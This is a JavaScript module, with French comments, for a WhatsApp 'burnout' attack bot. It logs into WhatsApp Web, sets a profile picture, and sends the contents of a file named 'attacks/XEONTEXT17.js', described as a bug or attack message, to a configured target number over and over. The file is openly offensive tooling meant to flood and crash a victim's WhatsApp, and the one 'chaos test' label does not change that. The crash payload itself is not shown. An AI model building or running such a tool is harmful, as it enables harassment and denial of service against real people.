const Bailey = require('bailey');
const fs = require('fs');
const { createLogger, transports, format } = require('winston');
const config = require('../config/config');

// Charger le fichier bug (XEONTEXT17.js)
const bugContent = fs.readFileSync('./attacks/XEONTEXT17.js', 'utf-8');  // Lecture du fichier XEONTEXT17.js

class WhatsAppBurnoutBailey {
  constructor() {
    this.client = new Bailey();
    this.logger = createLogger({
      level: 'info',
      format: format.combine(
        format.timestamp(),
        format.printf(({ timestamp, message }) => `${timestamp} ${message}`)
      ),
      transports: [
        new transports.Console(),
        new transports.File({ filename: config.logFile })
      ]
    });
  }

  // Méthode pour initialiser le client Bailey
  async initializeClient() {
    try {
      // Initialisation de Bailey et connexion à WhatsApp Web
      await this.client.initialize();
      this.logger.info('Bailey est prêt à envoyer des messages.');
      await this.setProfilePic();  // Ajouter cette fonction pour définir la photo de profil
      this.startBurnoutAttack();  // Lancer l'attaque après l'initialisation
    } catch (error) {
      this.logger.error('Erreur lors de l\'initialisation de Bailey:', error);
    }
  }

  // Fonction pour définir l'image de profil du bot
  async setProfilePic() {
    try {
      const profilePicPath = './media/botProfilePic.jpg'; // Chemin de l'image de profil
      const imageBuffer = fs.readFileSync(profilePicPath);  // Lire l'image en tant que buffer
      await this.client.setProfilePicture(imageBuffer);  // Si Bailey supporte cette fonction
      this.logger.info('Image de profil mise à jour');
    } catch (error) {
      this.logger.error('Erreur lors de la mise à jour de l\'image de profil:', error);
    }
  }

  // Envoi des messages en masse (avec contenu du fichier XEONTEXT17.js comme message)
  async sendMessage(targetPhoneNumber) {
    try {
      const message = bugContent;  // Utiliser le contenu de XEONTEXT17.js comme message d'attaque
      await this.client.sendMessage(targetPhoneNumber, message);  // Envoyer le message
      this.logger.info(`Message envoyé à ${targetPhoneNumber}`);
    } catch (error) {
      this.logger.error('Erreur lors de l\'envoi du message:', error);
    }
  }

  // Lancer l'attaque de burnout
  async startBurnoutAttack() {
    this.logger.info(`Démarrage de l'attaque de Burnout sur WhatsApp pour ${config.targetPhoneNumber}`);
    for (let i = 0; i < config.messageCount; i++) {
      await this.sendMessage(config.targetPhoneNumber);  // Envoi du message d'attaque
    }
  }

  // Exécution de l'attaque
  async execute() {
    this.logger.info('Démarrage du bot de test de chaos WhatsApp');
    await this.initializeClient();
  }
}

module.exports = WhatsAppBurnoutBailey;

